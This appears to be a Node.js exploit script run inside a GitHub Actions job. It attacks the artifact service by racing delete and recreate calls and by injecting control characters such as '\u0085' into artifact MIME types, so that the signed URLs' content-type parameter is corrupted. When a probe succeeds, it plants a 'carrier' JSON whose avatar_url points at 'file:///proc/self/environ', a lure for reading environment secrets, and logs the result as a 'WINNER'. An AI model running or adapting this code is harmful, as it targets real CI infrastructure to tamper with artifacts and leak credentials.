import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"delete-recreate"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

async function create(name, version) {
  try {
    const value = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      version,
      mimeType: StringValue.create({value: version === 7 ? 'application/json' : odd}),
    });
    return {ok: true, url: value.signedUploadUrl};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function upload(url, bytes = placeholder) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function del(name) {
  try {
    const value = await client.DeleteArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: Boolean(value.ok)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: true, rsct: new URL(value.signedUrl).searchParams.get('rsct')};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function putCarrier(urls, id) {
  const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${id}/zip`;
  const bytes = Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette delete/recreate carrier',
    stargazers_count: 0,
  }));
  await Promise.all(urls.filter(Boolean).map(url => upload(url, bytes).catch(() => false)));
  return repository;
}

async function pendingTrial(index, firstVersion) {
  const name = `pending-${process.env.GITHUB_RUN_ID}-${firstVersion}-${index}`;
  const first = await create(name, firstVersion);
  await upload(first.url);
  const deleted = await del(name);
  const second = await create(name, firstVersion === 7 ? 6 : 7);
  await upload(second.url);
  const final = await finalize(name);
  const view = await inspect(name);
  const row = {kind: 'pending', index, firstVersion, first, deleted, second, final, view};
  if (view.rsct?.includes('\u0085') && final.id) {
    row.repository = await putCarrier([first.url, second.url], final.id);
    console.log(`WINNER ${JSON.stringify(row)}`);
  }
  return row;
}

async function finalizedTrial(index, firstVersion, delay) {
  const name = `finalized-${process.env.GITHUB_RUN_ID}-${firstVersion}-${delay + 30}-${index}`;
  const first = await create(name, firstVersion);
  await upload(first.url);
  const oldFinal = await finalize(name);
  let deletePromise;
  let createPromise;
  if (delay < 0) {
    deletePromise = del(name);
    await sleep(-delay);
    createPromise = create(name, firstVersion === 7 ? 6 : 7);
  } else {
    createPromise = create(name, firstVersion === 7 ? 6 : 7);
    await sleep(delay);
    deletePromise = del(name);
  }
  const [deleted, second] = await Promise.all([deletePromise, createPromise]);
  await upload(second.url);
  const final = await finalize(name);
  const view = await inspect(name);
  const row = {kind: 'finalized', index, firstVersion, delay, first, oldFinal, deleted, second, final, view};
  if (view.rsct?.includes('\u0085') && (final.id || oldFinal.id)) {
    const id = final.id || oldFinal.id;
    row.repository = await putCarrier([first.url, second.url], id);
    console.log(`WINNER ${JSON.stringify(row)}`);
  }
  return row;
}

const candidates = [
  'application/json',
  'application/json%85',
  'application/json%C2%85',
  '%C2%85application/json',
  'application%2Fjson%C2%85',
  'application/json\\u0085',
  'application/json\u001c',
  'application/json\u001d',
  'application/json\u001e',
  'application/json\u001f',
  'application/json\u0085',
  '\u0085application/json',
  'application/json; charset=\u0085',
  'application/json \u0085',
  'application/json%0a',
  'application/json?rsct=%C2%85application/json',
];
for (let i = 0; i < candidates.length; i += 4) {
  await Promise.all(candidates.slice(i, i + 4).map(async (mime, offset) => {
    const name = `mime-${process.env.GITHUB_RUN_ID}-${i + offset}`;
    try {
      const created = await client.CreateArtifact({
        workflowRunBackendId: ids.workflowRunBackendId,
        workflowJobRunBackendId: ids.workflowJobRunBackendId,
        name,
        version: 7,
        mimeType: StringValue.create({value: mime}),
      });
      await upload(created.signedUploadUrl);
      const final = await finalize(name);
      const view = await inspect(name);
      const row = {mime, id: final.id, rsct: view.rsct};
      if (final.id && (!view.rsct || view.rsct.includes('\u0085'))) {
        row.repository = await putCarrier([created.signedUploadUrl], final.id);
      }
      console.log(`MIME ${JSON.stringify(row)}`);
    } catch (error) {
      console.log(`MIME_ERROR ${JSON.stringify({mime, error: String(error).slice(0, 150)})}`);
    }
  }));
}
